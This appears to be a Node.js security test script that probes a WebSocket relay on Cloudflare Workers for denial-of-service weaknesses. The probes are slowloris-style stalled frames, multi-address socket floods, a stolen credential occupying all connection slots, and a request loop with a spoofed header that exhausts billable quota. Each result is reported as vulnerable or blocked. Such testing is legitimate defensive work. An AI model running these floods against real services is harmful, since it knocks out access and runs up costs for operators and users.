#!/usr/bin/env node
// Attacker: external, no credential; knows the victim's relay host id (it is in every pairing QR
// and is confirmed by the oracle in 02).
// Measures how long unauthenticated sockets are held, how many can be parked on the victim, what
// a flood from several addresses does to a real phone, and how fast one address can burn billable
// Worker / Durable Object requests.
import { randomBytes } from 'node:crypto'
import {
  freshSourceIp,
  hostOnline,
  installResumeCredential,
  openSocket,
  phoneOpen,
  relayAuthFrame,
  relayOrigin,
  report,
  setSourceIp,
  sleep,
  splice,
  wsOrigin
} from '../lib/relay-protocol.mjs'

const origin = relayOrigin()
setSourceIp(freshSourceIp())
const victim = await hostOnline(origin)
const hostId = victim.keys.hostId
const device = await installResumeCredential(victim.control)

async function lifetime(open, act, capMs = 30000) {
  const started = Date.now()
  const socket = await open()
  act?.(socket)
  const closed = await socket.waitClosed(capMs)
  return { heldMs: closed ? Date.now() - started : `>${capMs}`, close: closed }
}

// ---- slowloris: how long is one silent / stalled socket held? ----
setSourceIp(freshSourceIp())
report(
  'idle unauthenticated phone socket on a live host',
  'info',
  await lifetime(() => phoneOpen(origin, hostId))
)
report(
  'idle unauthenticated phone socket on an unknown host',
  'info',
  await lifetime(() => phoneOpen(origin, randomBytes(12).toString('base64url')))
)
report(
  'phone socket that starts a frame and never finishes it',
  'info',
  await lifetime(
    () => phoneOpen(origin, hostId),
    // Text frame header announcing 100 bytes, then 10 bytes of payload and nothing more.
    (socket) =>
      socket.ws._socket.write(
        Buffer.concat([Buffer.from([0x81, 0x80 | 100, 0, 0, 0, 0]), Buffer.alloc(10, 0x7b)])
      )
  )
)
report(
  'phone socket dripping one byte per 500 ms',
  'info',
  await lifetime(
    () => phoneOpen(origin, hostId),
    (socket) => {
      const frame = Buffer.concat([
        Buffer.from([0x81, 0x80 | 100, 0, 0, 0, 0]),
        Buffer.alloc(100, 0x20)
      ])
      let index = 0
      const timer = setInterval(() => {
        if (index >= frame.length - 1 || socket.closed) {
          return clearInterval(timer)
        }
        try {
          socket.ws._socket.write(frame.subarray(index, ++index))
        } catch {
          clearInterval(timer)
        }
      }, 500)
    }
  )
)
report(
  'unauthenticated host-data socket on an unknown connId',
  'info',
  await lifetime(() => {
    const socket = openSocket(
      `${wsOrigin(origin)}/v1/host/data/${hostId}.0.${randomBytes(8).toString('hex')}`
    )
    return socket.open().then(() => socket)
  })
)
{
  // A phone that authenticated with a real credential but whose splice then sits silent: is there
  // an idle timeout (RELAY_PROTOCOL_LIMITS.idleTimeoutMs = 10 min is declared)?
  const live = await splice(origin, victim, device.resumeToken)
  const idleFor = Number(process.env.IDLE_PROBE_MS ?? 20000)
  await sleep(idleFor)
  report(
    `authenticated splice left silent for ${idleFor} ms`,
    live.phone.closed
      ? 'info (closed)'
      : 'info (still open; no idle timeout on the edge, see report)',
    { close: live.phone.closed }
  )
  live.phone.ws.terminate()
}

// ---- flood: park sockets on the victim from many addresses ----
{
  const SOURCES = Number(process.env.SOURCES ?? 20)
  const PER_SOURCE = 120 // the limiter's per-address budget per minute
  const parked = []
  let refused = 0
  const started = Date.now()
  for (let s = 0; s < SOURCES; s++) {
    setSourceIp(freshSourceIp())
    const batch = await Promise.all(
      Array.from({ length: PER_SOURCE }, () => phoneOpen(origin, hostId))
    )
    for (const socket of batch) {
      if (socket.upgradeStatus) {
        refused++
      } else {
        parked.push(socket)
      }
    }
  }
  const openNow = parked.filter((socket) => !socket.closed).length
  // A real phone connecting in the middle of it.
  setSourceIp(freshSourceIp())
  const t = Date.now()
  const legit = await splice(origin, victim, device.resumeToken)
  report(
    `flood: ${SOURCES} addresses x ${PER_SOURCE} unauthenticated phone upgrades`,
    legit.hello?.ok === true
      ? 'blocked (real phone still connects)'
      : 'VULNERABLE (real phone locked out)',
    {
      upgradesAccepted: parked.length,
      refused429: refused,
      floodSeconds: Number(((Date.now() - started) / 1000).toFixed(1)),
      stillOpenAtEnd: openNow,
      legitPhoneHello: legit.hello?.ok ?? null,
      legitConnectMs: Date.now() - t,
      victimControlOpen: victim.control.closed === null
    }
  )
  for (const socket of parked) {
    socket.ws.terminate()
  }
  legit.phone?.ws.terminate()
}
{
  // The 8-connection budget counts authorized connections only: a stolen (not yet revoked)
  // credential can fill it and keep the owner's own phone out.
  setSourceIp(freshSourceIp())
  const held = []
  for (let i = 0; i < 8; i++) {
    held.push(await splice(origin, victim, device.resumeToken))
  }
  const ninth = await phoneOpen(origin, hostId)
  ninth.ws.send(relayAuthFrame(device.resumeToken))
  const hello = await ninth.nextJson(4000)
  report(
    'one stolen credential holding all 8 connection slots',
    hello?.code === 4429 ? 'info (owner gets 4429 until the device is revoked)' : 'blocked',
    { ninthHello: hello }
  )
  for (const h of held) {
    h.phone.ws.terminate()
  }
}

// ---- cost: billable requests one address can cause ----
{
  setSourceIp(freshSourceIp())
  const started = Date.now()
  let sent = 0
  let limited = 0
  const DURATION_MS = Number(process.env.COST_PROBE_MS ?? 5000)
  while (Date.now() - started < DURATION_MS) {
    const batch = await Promise.all(
      Array.from({ length: 50 }, () =>
        fetch(`${origin}/v1/connect/${hostId}`, {
          headers: { 'cf-connecting-ip': '203.0.113.200' }
        }).then((r) => r.status)
      )
    )
    sent += batch.length
    limited += batch.filter((status) => status === 429).length
  }
  const perSecond = sent / ((Date.now() - started) / 1000)
  // Every one of these invoked the Worker, 429 or not: the limiter runs inside it.
  report(
    'Worker invocations from one address (the limiter runs inside the Worker)',
    'VULNERABLE (cost / quota exhaustion)',
    {
      requestsSent: sent,
      answered429: limited,
      perSecondLocal: Math.round(perSecond),
      secondsToUse100kDailyFreeRequestsAtThisRate: Math.round(100000 / perSecond),
      note: 'a 429 from the Rate Limiting binding is still a billed Worker request; only a zone-level WAF rule stops it before the Worker'
    }
  )
}
victim.control.ws.terminate()
process.exit(0)
